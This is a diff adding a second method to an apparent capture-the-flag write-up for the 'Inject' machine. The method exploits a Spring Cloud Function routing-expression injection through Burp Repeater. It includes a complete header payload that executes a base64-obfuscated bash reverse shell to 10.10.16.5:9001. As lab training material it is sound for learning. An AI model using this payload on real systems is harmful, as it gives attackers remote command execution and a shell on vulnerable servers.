@@ -45,3 +45,11 @@ First will be msfconsole. This is a module what's give you a reverse-shell: ```e
 ![image](https://github.com/Anogota/Inject/assets/143951834/747fb917-4fd0-4e6d-b177-8960e5ca1ce1)
 
 And you get a shell, let's now do secend way.
+Intercept a traffic and go to reapter.
+Then change request method to POST, write ```spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzkwMDEgMD4mMQo=}|{base64,-d}|{bash,-i}")``` I little bit change it, i got this from ```https://github.com/Kirill89/CVE-2022-22963-PoC/tree/master``` but rember to change it the base64, inside this in bash reverse-shell you can get it by, insert in terminal 
+
+![image](https://github.com/Anogota/Inject/assets/143951834/8ca95f8f-3032-47a3-8444-2d99cab6e700)
+
+And when you change everything insert this in intercept packiet in burp. and you got a shell
+
+![image](https://github.com/Anogota/Inject/assets/143951834/bdee2cff-e1c1-4522-a53c-203650feadbf)
